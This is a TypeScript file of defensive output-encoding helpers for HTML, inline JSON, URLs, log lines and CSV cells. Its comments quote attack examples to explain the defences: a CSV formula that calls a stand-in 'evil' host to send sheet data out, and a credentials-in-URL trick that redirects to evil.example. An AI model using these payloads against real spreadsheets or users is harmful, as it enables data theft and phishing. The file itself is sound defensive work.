/**
 * There is no "sanitised string", only one encoded for a specific sink:
 * text node or quoted attribute → escapeHtml; href/src → safeUrl; inline
 * JSON → escapeJsonForHtml; URL parameter → encodeURIComponent; unquoted
 * attribute or CSS → do not interpolate input at all.
 */

// Written as escapes so no invisible character ever sits in the source.
/* eslint-disable no-control-regex */
const INVISIBLE = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F\u200B-\u200F\u202A-\u202E\u2060-\u2064\u206A-\u206F\uFEFF]/gu;
const CONTROL = /[\u0000-\u001F\u007F-\u009F]/gu;
/* eslint-enable no-control-regex */

/**
 * NFC plus invisible characters removed (zero-width, bidi overrides,
 * BOM). Normalise before comparing: a combining-character "admin" renders like
 * "admin" and compares unequal.
 */
export function normaliseText(value: string): string {
  return value.normalize('NFC').replace(INVISIBLE, '');
}

/** Text node or QUOTED attribute. `&` first, or the later entities are double-encoded. */
export function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * JSON inside `<script>`: `</script>` in a string ends the element, and
 * U+2028/2029 are line terminators in JS. Better still: `<script
 * type="application/json">` and `JSON.parse(el.textContent)`.
 */
export function escapeJsonForHtml(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}

const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:', 'tel:']);

/**
 * For `href`/`src`, which JSX passes through unescaped: `javascript:` in a
 * profile URL is a one-click XSS. Null means "render it without a link".
 * `//host` and `/\host` look relative and are not.
 */
export function safeUrl(value: string, options: { allowRelative?: boolean } = {}): string | null {
  const url = normaliseText(value).replace(CONTROL, '').trim();
  if (url === '' || url.startsWith('//') || url.startsWith('/\\') || url.startsWith('\\')) return null;
  if (/^(?:\/|\.\.?\/|#)/.test(url)) return options.allowRelative === false ? null : url;
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return null;
  }
  // `https://trusted.com@evil.example/` goes to evil.example.
  if (!SAFE_SCHEMES.has(parsed.protocol) || parsed.username || parsed.password) return null;
  return parsed.toString();
}

/** `noopener` severs `window.opener` (tab-nabbing); `noreferrer` keeps your URL out of Referer. */
export function externalLinkProps(href: string): { href: string; target: '_blank'; rel: string } {
  return { href, target: '_blank', rel: 'noopener noreferrer nofollow' };
}

/** Logs, headers, subjects: a newline in a display name must not forge a second line. */
export function singleLineText(value: string, maxLength = 2000): string {
  const line = normaliseText(value).replace(CONTROL, ' ').replace(/\s+/g, ' ').trim();
  return line.length > maxLength ? `${line.slice(0, maxLength)}…` : line;
}

/**
 * A quoted CSV cell that a spreadsheet will not evaluate:
 * `=HYPERLINK("https://evil?d="&A1)` in a display name exfiltrates the sheet.
 */
export function safeCsvCell(value: unknown): string {
  let text: string;
  if (value === null || value === undefined) text = '';
  else if (typeof value === 'string') text = value;
  else if (typeof value === 'number' || typeof value === 'boolean' || typeof value === 'bigint') text = String(value);
  else if (value instanceof Date) text = value.toISOString();
  else {
    try {
      text = JSON.stringify(value) ?? '';
    } catch {
      text = '';
    }
  }
  const cleaned = text.replace(CONTROL, ' ');
  const body = /^[=+\-@\t\r]/.test(cleaned) ? `'${cleaned}` : cleaned;
  return `"${body.replace(/"/g, '""')}"`;
}
